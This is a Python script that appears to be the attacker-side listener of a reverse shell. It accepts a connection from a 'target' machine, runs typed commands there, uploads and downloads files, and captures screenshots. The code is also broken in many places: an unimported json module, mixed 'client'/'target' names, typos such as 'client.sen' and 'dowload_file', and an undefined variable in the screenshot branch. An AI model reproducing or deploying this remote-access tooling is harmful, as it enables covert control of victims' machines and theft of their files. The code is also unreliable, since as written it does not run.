# import modules
import socket
import os

# define host and port
host = '127.0.0.1'
port = 8080


# send data to the client
def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


# upload files to the client machine
def upload_file(file):
    f = open(file, 'rb')
    client.sen(f.read())


# download files from the client machine
def dowload_file(file):
    f = open(file, 'wb')
    client.settimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)

        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()



# start socket object
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# bind server to host and port
server.bind((host, port))

# listen for connections
server.listen(1)
print('[-] Waiting for connections...')

# accept connetion
client, addr = server.accept()
print(f'\n\033[32m[+]\033[m Connected to {addr[0]} on port {addr[1]}')

# counter for screenshot enumeration files
count = 0

# shell session
while True:
    comm = input(f'\n{addr[0]}*shell: ')
    if comm == 'close':
        break
    elif comm == '':
        pass
    elif comm == 'clear':
        os.system('clear')
    elif comm [:3] == 'cd ':
        pass
    elif comm == 'upload':
        upload_file(comm[:7])
    elif comm == 'download':
        download_file(comm[:9])
    elif comm == 'help':
        print('''\n
        close: close the connection with the client.
        upload <file>: upload a file to the client machine.
        download <file>: get a file from the client machine.
        screenshot: takes a screenshot from the target machine.
        clear: clear terminal.
        \n
        ''')
    elif comm == 'screenshot':
        f = open('screenshot' % (count), 'wb')
        client.settimeout(5)
        f = open(file, 'wb')
        target.settimeout(5)
        chunkk = client.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout as e:
                break
        client.settimeout(None)
        f.close()
        count += 1
    else:
        client.send(comm.encode())
        output = client.recv(1024).decode()
        print(output)

server.close()
